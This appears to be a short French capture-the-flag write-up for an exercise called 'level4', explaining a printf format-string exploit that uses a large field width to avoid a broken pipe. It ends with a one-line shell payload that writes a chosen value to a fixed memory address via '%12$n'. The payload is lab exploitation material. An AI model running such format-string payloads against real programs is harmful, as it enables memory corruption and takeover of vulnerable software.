# level4

On a encore un `printf` à exploiter.

On aimerait faire comme l'exercice précédent mais si on veut print `0x1025544` chars, on a un broken pipe !

Donc on écrit n'importe quoi (ici `%x`) et on lui donne une width de `0x1025544` pour que la string soit générée à la volée

On a notre payload:
```bash
./level4 <<<$(python -c "print '\x10\x98\x04\x08' + '%16930111x\n' + '%12\$n'")
```
